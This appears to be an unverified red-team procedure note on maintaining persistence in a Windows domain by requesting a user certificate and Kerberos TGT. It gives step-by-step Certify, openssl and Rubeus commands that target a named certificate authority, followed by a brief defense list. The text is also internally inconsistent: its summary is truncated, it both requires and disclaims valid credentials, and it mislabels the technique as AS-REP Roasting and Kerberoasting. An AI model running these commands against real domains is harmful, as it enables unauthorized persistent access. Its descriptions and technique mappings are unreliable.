---
id: 8e9f1b83-a8d4-4452-8db1-5318a8494079
name: User Certificate and TGT Persistence via Domain Request
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:28.367785+00:00'
updated_at: '2023-04-10T20:37:28.914061+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]'
sub_techniques:
- '[[AS-REP Roasting|T1558.004 - AS-REP Roasting]]'
- '[[Kerberoasting|T1558.003 - Kerberoasting]]'
tags:
- '[[Domain]]'
- '[[User Certificate]]'
- '[[Windows - Persistence]]'
commands:
- '[[Convert certificate for Rubeus]]'
- '[[Request certificate for User template]]'
- '[[Request TGT using certificate]]'
---

# User Certificate and TGT Persistence via Domain Request

## Summary

User certificate and Ticket Granting Ticket (TGT) persistence is a technique used by attackers to maintain access to a compromised Windows domain. This technique involves requesting a user certificate and TGT for a specific user account, which can then be used to authenticate to the domain without 

## Description

# Description

User certificate and Ticket Granting Ticket (TGT) persistence is a technique used by attackers to maintain access to a compromised Windows domain. This technique involves requesting a user certificate and TGT for a specific user account, which can then be used to authenticate to the domain without needing to provide valid credentials. By requesting these certificates and tickets, attackers can maintain persistent access to the domain, even after the initial compromise has been detected and removed.

To request a user certificate and TGT, the attacker must have access to a domain-joined computer and valid domain credentials. The attacker can use the 'Request Certificate and TGT for User' command to request the necessary certificates and tickets for a specific user account. Once obtained, the attacker can use these certificates and tickets to authenticate to the domain and maintain persistent access.

This technique can be valuable to attackers because it allows them to maintain access to the domain without needing to rely on stolen credentials or other techniques that can be easily detected and blocked. It can also be difficult for defenders to detect, as the certificates and tickets can appear legitimate and may not be flagged by security tools.

 

## Requirements

1. Access to a domain-joined computer

1. Valid domain credentials

 

## Defense

1. Monitor for abnormal certificate and ticket requests

1. Limit the number of users who can request certificates and tickets

1. Implement multi-factor authentication to prevent unauthorized access to user accounts

 

## Objectives

1. Maintain persistent access to a compromised Windows domain

1. Authenticate to the domain without needing to provide valid credentials

 

# Instructions

1. To request a certificate for the User template, run the command: .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User. After obtaining the certificate, convert it for Rubeus by running the command: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx. Finally, request a TGT using the certificate by running the command: .\Rubeus.exe asktgt /user:username /certificate:C:\Temp\cert.pfx /password:Passw0rd123!

 



**Code**: [[# Request a certificate for the User template
.\Ce]]



> This command is used to request a certificate for the User template, which can then be used to request a Ticket Granting Ticket (TGT) using Rubeus. The command involves three steps: requesting the certificate, converting it for Rubeus, and using it to request a TGT. The 'Certify.exe' tool is used to request the certificate, 'openssl' is used to convert it for Rubeus, and 'Rubeus.exe' is used to request the TGT. The command arguments include the CA server, the certificate template, the user name, and the password.



**Command** ([[Request certificate for User template]]):

```bash
.\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User
```





**Command** ([[Convert certificate for Rubeus]]):

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```





**Command** ([[Request TGT using certificate]]):

```bash
.\Rubeus.exe asktgt /user:username /certificate:C:\Temp\cert.pfx /password:Passw0rd123!
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]

### Sub-Techniques

- [[AS-REP Roasting|T1558.004 - AS-REP Roasting]]
- [[Kerberoasting|T1558.003 - Kerberoasting]]

## Commands Used

- [[Convert certificate for Rubeus]]
- [[Request certificate for User template]]
- [[Request TGT using certificate]]

## Tags

- [[Domain]]
- [[User Certificate]]
- [[Windows - Persistence]]


